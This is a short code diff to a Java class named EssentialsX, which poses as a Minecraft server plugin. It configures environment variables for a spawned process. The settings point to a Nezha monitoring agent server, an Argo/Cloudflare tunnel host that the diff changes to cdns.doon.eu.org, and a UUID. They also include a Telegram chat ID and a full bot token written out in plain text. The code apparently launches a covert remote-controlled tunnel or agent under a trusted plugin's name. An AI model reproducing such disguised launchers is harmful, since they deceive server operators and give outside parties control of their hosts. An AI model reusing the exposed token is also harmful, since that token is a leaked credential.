@@ -73,7 +73,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "b21795d8-02m7-4cd1-a13f-aef25d120au3");
+        env.put("UUID", "587860cc-825f-4955-a766-83fdf6c5a250");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nz.xry.kdns.fr:443");
         env.put("NEZHA_PORT", "");
@@ -90,7 +90,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "7627328147");
         env.put("BOT_TOKEN", "8712829238:AAEkSunL7neEXazQUzTXFaWFbajD2SQEA-Y");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
         env.put("NAME", "hidencloud");
         env.put("DISABLE_ARGO", "false");
